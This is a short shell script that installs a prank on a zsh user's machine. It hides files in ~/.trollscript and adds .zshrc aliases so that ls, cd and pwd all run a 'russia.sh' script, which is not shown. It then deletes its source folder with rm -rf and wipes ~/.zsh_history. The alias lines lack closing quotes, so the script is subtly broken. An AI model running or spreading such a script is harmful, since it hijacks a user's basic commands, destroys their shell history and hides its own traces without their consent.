mkdir ~/.trollscript
cd mmmh..._yes
mv * ~/.trollscript

echo "alias ls='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc
echo "alias cd='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc
echo "alias pwd='sh /home/$(whoami)/.trollscript/russia.sh" >> .zshrc

cd
rm -rf ../mmmh..._yes
echo "" > ~/.zsh_history & exec $SHELL -l

source .zshrc
